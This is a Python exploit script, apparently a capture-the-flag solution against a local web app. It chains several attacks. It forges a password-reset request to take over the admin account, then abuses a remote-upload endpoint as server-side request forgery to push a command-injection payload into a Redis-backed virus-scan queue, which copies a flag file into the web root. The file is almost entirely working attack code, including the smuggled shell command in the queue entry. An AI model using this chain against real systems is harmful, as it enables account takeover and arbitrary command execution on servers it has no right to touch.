#!/usr/bin/env python3
import requests
import secrets
import time

BASE_URL = "http://localhost"

ADMIN_USER_ID = 1
USERNAME = secrets.token_hex(8)
EMAIL = f"{USERNAME}@example.comA"
PASSWORD = "password"

REDIS_HOST = "localhost"
REDIS_QUEUE = "clamav_queue"


def register(username: str, email: str, password: str) -> requests.Session:
    print(f"Register as {username}")
    sess = requests.Session()
    resp = sess.post(
        BASE_URL + "/api/auth/register",
        json={
            "username": username,
            "email": email,
            "password": password,
            "confirmPassword": password,
        },
    )
    print(resp.text)
    return sess


def login(username: str, password: str) -> requests.Session:
    sess = requests.Session()
    resp = sess.post(
        BASE_URL + "/api/auth/login", json={"username": username, "password": password}
    )
    print(resp.text)
    print(f"Cookies for {username}: {resp.cookies}")
    return sess


def get_user_id(sess: requests.Session) -> int:
    resp = sess.get(BASE_URL + "/api/user/profile")
    return resp.json()["data"]["id"]


def send_reset_password(email: str) -> str:
    resp = requests.post(BASE_URL + "/api/auth/send-password-reset", json={"email": email})
    print(resp.text)

    resp = requests.get(BASE_URL + "/api/auth/email")
    data = resp.json()
    for line in data["data"][::-1]:
        return line.split("token=")[1].split("|")[0]
    raise Exception("Token not found!")


def reset_password(email: str, token: str, password: str) -> None:
    resp = requests.post(
        BASE_URL + "/api/auth/reset-password",
        json={"email": email, "token": token, "password": password},
    )
    print(resp.text)


def remote_upload(sess: requests.Session, url: str, filename: str, http_method: str):
    resp = sess.post(
        BASE_URL + "/api/file/remote-upload",
        json={"url": url, "filename": filename, "httpMethod": http_method},
    )
    print(resp.text)


sess = register(USERNAME, EMAIL, PASSWORD)
token = send_reset_password(EMAIL)
print(f"Token: {token}")
user_id = get_user_id(sess)
email_spoofed = EMAIL[:-1] + chr(ord(EMAIL[-1]) + user_id - ADMIN_USER_ID)
print(f"UserID: {user_id}, Email: {email_spoofed}")
reset_password(email_spoofed, f"{token}|{ADMIN_USER_ID}", PASSWORD)

sess = login("admin", PASSWORD)

command = "cp /app/flag* /usr/share/nginx/html/flag.txt"
redis_ssrf = f"""RPUSH {REDIS_QUEUE} "/etc/hosts'; {command} #"\n"""
remote_upload(sess, f"http://{REDIS_HOST}:6379", "image.png", redis_ssrf)

print("=> Waiting for the command to be executed...")
time.sleep(60)
print(requests.get(BASE_URL + "/flag.txt").text)
